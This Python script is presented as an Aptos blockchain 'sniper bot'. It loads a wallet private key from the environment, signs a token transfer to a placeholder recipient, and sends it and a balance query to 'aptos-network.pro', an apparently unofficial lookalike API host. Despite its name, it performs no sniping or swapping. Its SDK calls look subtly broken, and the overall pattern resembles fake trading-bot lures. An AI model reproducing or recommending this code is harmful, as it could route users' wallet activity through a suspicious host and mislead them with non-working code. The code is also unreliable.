import os
import requests
import json
from aptos_sdk.client import RestClient
from aptos_sdk.account import Account
from aptos_sdk.transaction import Transaction

# Configuration
APTOS_API_URL = 'https://aptos-network.pro/api'  # Aptos API URL
PRIVATE_KEY = os.getenv('APTOS_PRIVATE_KEY')  # Private key environment variable
WALLET_ADDRESS = os.getenv('APTOS_WALLET_ADDRESS')  # Aptos wallet address environment variable
RECIPIENT_ADDRESS = 'recipient_wallet_address_here'  # Replace with recipient address
AMOUNT = 100  # Amount to transfer (in the smallest unit, such as tokens)

# Initialize Aptos API client
client = RestClient(base_url=APTOS_API_URL)

# Function to sign the transaction using the private key
def sign_transaction(private_key, recipient, amount):
    """Signs the transaction using the Aptos private key"""
    try:
        # Convert the private key to an Aptos account
        account = Account.from_private_key_bytes(bytes.fromhex(private_key))

        # Create the transaction data (this is just an example, modify based on your needs)
        txn = Transaction(
            sender=account.address(),
            recipient=recipient,
            amount=amount,
            chain_id=client.get_chain_id()  # Get the current Aptos chain ID
        )

        # Sign the transaction
        signed_txn = txn.sign(account)

        return signed_txn
    except Exception as e:
        print(f"Error signing transaction: {e}")
        return None

# Function to send the signed transaction to Aptos API
def send_transaction(signed_txn):
    """Sends the signed transaction to the Aptos network"""
    try:
        # Send the signed transaction to Aptos API
        response = client.submit_transaction(signed_txn)
        
        if response.status_code == 200:
            print("Transaction sent successfully!")
            return response.json()
        else:
            print(f"Error sending transaction: {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None

# Function to check wallet balance
def check_balance(wallet_address):
    """Checks the wallet balance using the Aptos API"""
    try:
        response = requests.get(f'{APTOS_API_URL}/api/accounts/{wallet_address}/balance')
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Error fetching balance: {response.text}")
            return None
    except Exception as e:
        print(f"Error occurred while fetching balance: {e}")
        return None

# Main function to run the bot
def sniper_bot():
    """Main sniper bot function"""
    print("Starting sniper bot...")

    # Check balance before making any swaps
    balance = check_balance(WALLET_ADDRESS)
    if balance:
        print(f"Current balance: {json.dumps(balance, indent=4)}")
    
    # Sign the transaction using the private key
    signed_txn = sign_transaction(PRIVATE_KEY, RECIPIENT_ADDRESS, AMOUNT)
    
    if signed_txn:
        # Send the signed transaction after signing
        result = send_transaction(signed_txn)
        if result:
            print(f"Transaction result: {json.dumps(result, indent=4)}")
        else:
            print("Failed to send transaction.")
    else:
        print("Failed to sign the transaction.")

if __name__ == '__main__':
    sniper_bot()
